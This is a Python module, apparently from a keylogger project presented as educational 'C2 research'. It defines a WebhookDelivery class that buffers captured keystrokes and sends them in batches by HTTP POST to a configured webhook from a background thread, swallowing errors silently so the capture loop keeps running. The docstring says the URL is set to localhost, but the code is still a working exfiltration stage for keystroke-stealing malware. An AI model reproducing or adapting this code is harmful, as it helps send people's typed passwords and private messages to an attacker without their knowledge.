import threading
import requests
from datetime import datetime
from .config import WEBHOOK_URL, WEBHOOK_ENABLED, WEBHOOK_BATCH, WEBHOOK_TIMEOUT


class WebhookDelivery:
    """
    Simulated remote delivery for C2 research purposes.

    IMPORTANT: WEBHOOK_URL is hardcoded to localhost (127.0.0.1) in config.py.
    This class intentionally does not support external URLs in its default
    configuration. Change it only to test against a server you control
    running on the same machine.

    Architecture:
    - Keystrokes accumulate in a buffer.
    - When the buffer reaches WEBHOOK_BATCH characters, a delivery is triggered
      in a background thread so the listener thread is never blocked on I/O.
    - Delivery failures are silently swallowed — the primary log file is always
      the authoritative record; webhook is secondary.
    """

    def __init__(self):
        self._buffer  = []
        self._lock    = threading.Lock()
        self._enabled = WEBHOOK_ENABLED

    def feed(self, text: str):
        """
        Add text to the delivery buffer.
        Triggers a delivery attempt when the batch size is reached.
        No-op if WEBHOOK_ENABLED is False.
        """
        if not self._enabled:
            return

        with self._lock:
            self._buffer.append(text)
            total = sum(len(s) for s in self._buffer)

        if total >= WEBHOOK_BATCH:
            self._dispatch()

    def _dispatch(self):
        """
        Copy and clear the buffer, then send in a background thread.
        We copy under lock but send outside the lock so the listener
        thread is never blocked waiting for the HTTP response.
        """
        with self._lock:
            if not self._buffer:
                return
            payload = "".join(self._buffer)
            self._buffer.clear()

        # Fire the HTTP request in a daemon thread —
        # if the main process exits, this thread is abandoned cleanly.
        t = threading.Thread(
            target=self._send,
            args=(payload,),
            daemon=True,
            name="webhook-send",
        )
        t.start()

    def _send(self, payload: str):
        """
        POST the payload to the configured webhook URL.
        All exceptions are caught — a failed delivery must never crash
        the main capture loop.
        """
        try:
            requests.post(
                WEBHOOK_URL,
                json={
                    "timestamp": datetime.utcnow().isoformat(),
                    "data":      payload,
                },
                timeout=WEBHOOK_TIMEOUT,
            )
        except Exception:
            # Silently discard delivery failures.
            # In a real implementation you might queue for retry,
            # but for educational purposes we keep this simple.
            pass

    def flush(self):
        """Force-deliver any remaining buffered content on shutdown."""
        if self._enabled:
            self._dispatch()
